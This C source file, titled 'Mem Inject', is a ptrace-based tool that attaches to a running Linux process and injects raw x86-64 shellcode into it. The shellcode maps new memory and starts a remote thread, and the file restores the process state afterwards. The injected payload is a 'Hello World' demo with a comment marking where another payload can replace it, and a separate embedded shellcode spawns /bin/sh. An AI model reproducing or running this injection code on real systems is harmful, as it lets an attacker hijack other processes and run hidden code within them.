/*
  Mem Inject
  Copyright (c) 2016 picoFlamingo
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
//compile gcc -m64 -o jugaad_64bit jugaad2.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>



#define SHELLCODE_SIZE 122

#define SHELLCODE_SIZE2 32
//size 32
//no mmap no thread, just spwaning a shell (for testing and debugging)
unsigned char*shellcode0=  "\x48\x31\xc0\x48\x89\xc2\x48\x89"
  "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
  "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
  "\x2f\x73\x68\x00\xcc\x90\x90\x90";



//clone&stack& hallo_world+syscall_exit
//2nd Shellcode when injecting (main shellcode) 
//size 122

unsigned char *shellcode = 
"\x48\x8d\x3d\x40\x00\x00\x00"
"\xe8\x01\x00\x00\x00"
"\xcc"
"\x57"
"\xe8\x16\x00\x00\x00"
"\x48\x8d\xb0\xf8\x1f\x40\x00"
"\x8f\x06"
"\xbf\x00\x09\x01\x00"
"\xb8\x38\x00\x00\x00"
"\x0f\x05"
"\xc3"
"\xbf\x00\x00\x00\x00"
"\xbe\x00\x20\x40\x00"
"\xba\x07\x00\x00\x00"
"\x41\xba\x22\x00\x00\x00"
"\xb8\x09\x00\x00\x00"
"\x0f\x05"
"\x90"
"\xc3"
"\xeb\x0c"
"\x48"//ab hier kann eine payload funktion ersetzt werden
"\x65\x6c"
"\x6c"
"\x6f"
"\x20\x57\x6f"
"\x72\x6c"
"\x64\x0a"
"\xb8\x01\x00\x00\x00"
"\xbf\x01\x00\x00\x00"
"\x48\x8d\x35\xe3\xff\xff\xff"
"\xba\x0c\x00\x00\x00"
"\x0f\x05"
"\xbf\x00\x00\x00\x00"//syscall exit
"\xb8\x3c\x00\x00\x00"
"\x0f\x05\x90";


//size 126
/*letzer shellcode mit jmps (ohne calls) funktion ohne cc
unsigned char *shellcode = 
"\x48\x8d\x3d\x39\x00\x00\x00"
"\xeb\x00"
"\x57"
"\xeb\x16"
"\x48\x8d\xb0\xf8\xff\x3f\x00"
"\x8f\x06"
"\xbf\x00\x09\x01\x00"
"\xb8\x38\x00\x00\x00"
"\x0f\x05"
"\xc3"
"\xbf\x00\x00\x00\x00"
"\xbe\x00\x00\x40\x00"
"\xba\x07\x00\x00\x00"
"\x41\xba\x22\x00\x00\x00"
"\xb8\x09\x00\x00\x00"
"\x0f\x05"
"\xeb\xcc"
"\xeb\x0c"
"\x48"
"\x65\x6c"
"\x6c"
"\x6f"
"\x20\x57\x6f"
"\x72\x6c"
"\x64\x0a"
"\xb8\x01\x00\x00\x00"
"\xbf\x01\x00\x00\x00"
"\x48\x8d\x35\xe3\xff\xff\xff"
"\xba\x0c\x00\x00\x00"
"\x0f\x05"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90\xeb\xe7";
"\x48\xc7\xc0\x23\x00\x00\x00"//syscall sleep
"\x48\xc7\xc7\x05\x00\x00\x00"
"\x48\x31\xf6"
"\x0f\x05"
"\xeb\xd3\x90\x90\x90";
*/

//syscall exit 
/*
"\xbf\x00\x00\x00\x00"
"\xb8\x3c\x00\x00\x00"
"\x0f\x05\x90\x90";
*/


//size 32
//mmap shellcode: creates new mapping for the threadpayload->for the 2nd injecting payload
unsigned char *shellcode2=
"\xbf\x00\x00\x00\x00"
"\xbe\x00\x00\x40\x00"
"\xba\x07\x00\x00\x00"
"\x41\xba\x22\x00\x00\x00"
"\xb8\x09\x00\x00\x00"
"\x0f\x05\xcc\x90\x90\x90";


//collect_data is a funktion to create a backup of the tracee memory
unsigned char *
collect_data (pid_t pid, unsigned char *src, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  unsigned char* text=(unsigned char*)malloc(len);//generate a backup size of shellcode

  for (i = 0; i < len; i+=4, s++)
    {
      uint32_t *tmp=(uint32_t *)(text+i);//write to this playce
      uint32_t pword=0;
      pword=ptrace (PTRACE_PEEKTEXT, pid, s, NULL);
	if(pword < 0)
	{
	  perror ("ptrace(PEEKTEXT):");
	  exit(1);
	}
    *tmp=pword;
    }
  return text;
}


//inject_data is a funktion to inject code in the tracees memory
int
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  for (i = 0; i < len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
	{
	  perror ("ptrace(POKETEXT):");
	  return -1;
	}
    }
  return 0;
}

int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  struct user_regs_struct empty ;
  int                     syscall;
  long                    dst;
//create memory for the backup in the tracer
  unsigned char* backup=(unsigned char*)malloc(SHELLCODE_SIZE2);
  if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf ("+ Tracing process %d\n", target);
//attach to target process
  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }

  printf ("+ Waiting for process...\n");
  wait (NULL);
  //get the registers for a backup
  ptrace(PTRACE_GETREGS, target,NULL,&regs);
//copy the registers in an another regs_struct and empty the registers(execpt rip) in that copy
 memcpy(&empty,&regs,sizeof(struct user_regs_struct));
 empty.rdi=0;
 empty.rsi=0;
 empty.rdx=0;
 empty.r10=0;
 empty.r8=0;
 empty.r9=0;
  /* collect Tracee memory in backup */
 printf("Getting Backups at %p\n",(void*)regs.rip);
 backup=collect_data (target, (void*)regs.rip, SHELLCODE_SIZE2);

//inject mmap shellcode in tracee memory
  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
  inject_data (target, shellcode2, (void*)regs.rip, SHELLCODE_SIZE2);

 //set the empty registers for the first shellcode 
  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);
printf("setting empty registers\n");
  if ((ptrace (PTRACE_SETREGS, target, NULL, &empty)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  printf ("+ Run it!\n");//run the mmap shellcode
  ptrace(PTRACE_CONT, target,NULL,NULL);
  wait(NULL);
 printf("mmap finisched\n");
  sleep(10);//sleep is her so you can use  cat /proc/pid/maps after the first mmap()
//get the rax register so you have the target adress for the 2nd shellcode(threadshellcode)
 ptrace(PTRACE_GETREGS,target,NULL,&empty);
 printf("new mmap region at %p\n",(void*)empty.rax);

printf("CLeaning registers\n");
 empty.rdi=0;
 empty.rsi=0;
 empty.rdx=0;
 empty.r10=0;
 empty.r8=0;
 empty.r9=0;
 empty.rip=empty.rax;//set the rip register to the rax and clean all other registers
ptrace (PTRACE_SETREGS, target, NULL, &empty);
printf("Injecting Thread code at RAX\n");
inject_data(target,shellcode,(void*)empty.rax,SHELLCODE_SIZE);//inject the threadshellcode
ptrace(PTRACE_CONT, target,NULL,NULL);//run the threadshellcode
  wait(NULL);
//threadshellcode breaks with a sigtrap signal after clone
//inject the backup to its orignal memory
 inject_data (target, backup, (void*)regs.rip, SHELLCODE_SIZE2);

//set original backup registers
 printf("setting old registers\n");
 ptrace(PTRACE_SETREGS, target,NULL,&regs);
 //detach from tracee -> create remote thread finished
printf("Detaching\n");
  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
	{
	  perror ("ptrace(DETACH):");
	  exit (1);
	}
  return 0;

}
